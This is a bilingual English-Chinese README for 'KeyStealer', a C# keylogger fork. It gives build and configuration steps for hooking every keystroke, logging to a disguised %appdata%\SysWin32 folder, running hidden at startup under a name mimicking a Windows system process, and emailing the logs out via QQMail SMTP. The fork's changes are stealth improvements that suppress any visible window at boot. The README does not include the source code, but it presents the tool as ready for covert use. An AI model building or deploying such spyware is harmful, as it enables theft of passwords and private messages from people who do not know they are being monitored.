# KeyStealer 按键窃取
A basic keylogger written in C#
一个用c#实现的基本按键日志

# What
When you key down,the program will record the key in the computer and save it.In some condition ,it will email the log to you .
当你按键时，程序记录按键内容，存储在本地。在一定情况下，把存储内容通过邮箱发送给你。

## How?

Assuming you have Microsoft Visual Studio Community Edition 2017 
假设你已经有了visual studio 2017

设置引用：
- Open the project's solution ("Windows Locol Host Process.sln")
- Click "Project" > "Add new references".
- Select "System.Windows.Forms" in the Assemblies section
- Select "Windows Script Host Model" in the COM section
- Tick OK

改用你的密码：
- Change the following constant to match real addresses and password in program.cs
````
    private const string senderEmail = "xxx@qq.com";
    private const string receiverEmail = "xxx@qq.com";
    private const string senderPassword = "XXXXXXXXXXXXXXXXXXXXXX";//not the qqmail password
````
- Pay attention ! Do not use the QQMail password !!In QQMail settings ,set the SMTP protocol and you will get a independent password ,and use it. 请注意，使用的密码不是你的QQ邮箱密码，而要在QQ邮箱里设置SMPT协议允许，QQ邮箱会分配你一个独立密码。使用这个密码。  https://blog.csdn.net/mojocube/article/details/51517171
- You can use the same "senderEmail" and "receiverEmail". 你可以使用相同的"senderEmail"和"receiverEmail"

see more in "original ReadMe" at the end 更多的细节你可以看底部的 原始说明 部分
the following is my changes 接下来说说我改善的部分

## What changes?
What i changed is in the "Windows Locol Host Process".details are the following :
我改善的部分在 Windows Locol Host Process文件夹里，主要做了一下变化：

- Use winform replacing console app
- Solve the problem that the program cannot hide immediately when start computer but flash a black console and then hide  
- Use baidu.com replaing google.com to test intent because we Chinese cannot use google for the Great Fire Wall
- Use QQMail replacing Gmail for we Chinese cannot use Gmail...Orz
- Instead of copying directly to the startup item when it opens, it displays the form, clicks the button, and then copies to the startup item; but when its startup directory is the system directory, it hides the startup directly. The trouble of debugging is solved.


- 把控制台应用(console)变成了窗体应用(winform)
- 解决了开机启动时，闪一下窗口的问题（通过窗体的透明度设置）
- 使用baidu测试网络，解决了墙内(GFW)google不能直接使用的问题
- 使用了QQ邮箱，替代了原文的邮箱
- 不在开启时直接复制到启动项，而是显示窗体，点击按钮后，再复制到启动项；但当它的启动目录是系统目录时，则直接隐藏启动。解决了调试时的麻烦

## Features （compared with the original）
the old :

- [x] Hooking Windows LowLevelKeyboardProc to intercept every keystrokes
- [x] Logging the keys in a "nice" format to %appdata%\SysWin32\
- [x] Run hidden and at startup
- [x] Send mail to the desired address
- [ ] Make mail conditionnal to the internet connection
- [ ] Encrypt/compress logs
- [ ] GUI to configure the keylogger
- [ ] Add support for other transfert protocols
- [ ] Add configurable screenshot/pictures


mine:
- [x] Hooking Windows LowLevelKeyboardProc to intercept every keystrokes
- [x] Logging the keys in a "nice" format to %appdata%\SysWin32\
- [x] Run hidden and at startup
- [x] Send mail to the desired address
- [x] Make mail conditionnal to the internet connection
- [ ] Encrypt/compress logs
- [x] GUI to configure the keylogger
- [ ] Add support for other transfert protocols
- [ ] Add configurable screenshot/pictures

---
# original ReadMe is the following :
# KeyStealer
A basic keylogger written in C#

~Originally written for HighTechLowLife.eu

## What?
A keylogger is a type of surveillance software (considered to be either software or spyware) that has the capability to record every keystroke you make to a log file, usually encrypted. A keylogger recorder can record instant messages, e-mail, and any information you type at any time using your keyboard. The log file created by the keylogger can then be sent to a specified receiver. Some keylogger programs will also record any e-mail addresses you use and Web site URLsyou visit.

Keyloggers, as  a surveillance tool, are often used by employers to ensure employees use work computers for business purposes only. Unfortunately, keyloggers can also be embedded in spyware allowing your information to be transmitted to an unknown third party.

## How?

Assuming you have Microsoft Visual Studio Community Edition 2013 (http://go.microsoft.com/fwlink/?LinkId=517284)

- Open the project's solution ("Windows Local Host Process.sln")
- Click "Project" > "Add new references".
- Select "System.Windows.Forms" in the Assemblies section
- Select "Windows Script Host Model" in the COM section
- Tick OK
- Change the following constant to match real addresses and password in program.cs
````
    private const string senderEmail = "fakemail@gmail.com";
    private const string receiverEmail = "realmail@yourdomain.com";
    private const string senderPassword = "P4s5w0rd";
````

## Features

Here are the actual and future features of KeyStealer

- [x] Hooking Windows LowLevelKeyboardProc to intercept every keystrokes
- [x] Logging the keys in a "nice" format to %appdata%\SysWin32\
- [x] Run hidden and at startup
- [x] Send mail to the desired address
- [ ] Make mail conditionnal to the internet connection
- [ ] Encrypt/compress logs
- [ ] GUI to configure the keylogger
- [ ] Add support for other transfert protocols
- [ ] Add configurable screenshot/pictures
